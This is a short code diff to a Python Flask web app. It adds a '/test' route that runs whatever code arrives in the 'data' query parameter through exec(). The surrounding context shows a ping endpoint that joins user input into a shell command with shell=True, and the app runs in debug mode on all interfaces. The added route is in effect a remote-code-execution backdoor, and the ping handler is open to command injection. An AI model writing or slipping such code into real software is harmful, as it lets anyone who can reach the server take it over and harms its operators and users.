@@ -45,6 +45,12 @@ def ping():
     result = subprocess.call('ping -c 1 ' + host, shell=True)
     return f"Result: {result}"
 
+@app.route('/test')
+def test():
+    x = request.args.get('data')
+    exec(x)
+    return "Done"
+
 if __name__ == '__main__':
     app.run(debug=True, host='0.0.0.0')
 
